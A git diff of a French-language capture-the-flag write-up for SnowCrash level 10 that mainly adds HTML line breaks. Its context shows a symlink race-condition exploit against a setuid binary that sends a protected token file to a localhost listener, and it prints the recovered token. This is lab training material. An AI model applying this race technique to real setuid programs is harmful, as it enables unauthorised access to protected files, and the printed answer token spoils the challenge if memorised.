@@ -1,5 +1,7 @@
 # Level 10
 
+</br></br>
+
 ## file list in home
 ```zsh
 level10@SnowCrash:~$ ls -l
@@ -7,6 +9,7 @@ total 16
 -rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
 -rw-------  1 flag10 flag10     26 Mar  5  2016 token
 ```
+</br></br>
 
 ## execute file level10
 ```zsh
@@ -14,6 +17,8 @@ level10@SnowCrash:~$ ./level10
 ./level10 file host
         sends file to host if you have access to it
 ```
+</br></br>
+
 ## ltrace level10
 ```zsh
 level10@SnowCrash:~$ ltrace ./level10 
@@ -24,6 +29,7 @@ printf("%s file host\n\tsends file to ho"..., "./level10"./level10 file host
 exit(1 <unfinished ...>
 +++ exited (status 1) +++
 ```
+</br></br>
 
 ## strings level10
 ```zsh
@@ -62,6 +68,8 @@ printf("You don't have access to %s\n", "token"You don't have access to token
 
 on peut voir que level10 utilise access
 
+</br></br>
+
 ## access
 ```zsh
 level10@SnowCrash:~$ man access
@@ -86,6 +94,8 @@ Connecting to localhost:6969 .. Unable to connect to host localhost
 ```
 donc, on va executer token en utilisant race condition et symbolic link
 
+</br></br>
+
 ## symbolic link et race condition
 
 faire fichier link
@@ -108,6 +118,7 @@ do
   ln -fs ~/token ./link
 done
 ```
+</br></br>
 
 ## execute 
 ```zsh
@@ -150,6 +161,7 @@ woupa2yuojeeaaed06riuj63c
 woupa2yuojeeaaed06riuj63c
 .*( )*.
 ```
+</br></br>
 
 ## get token
 ```zsh
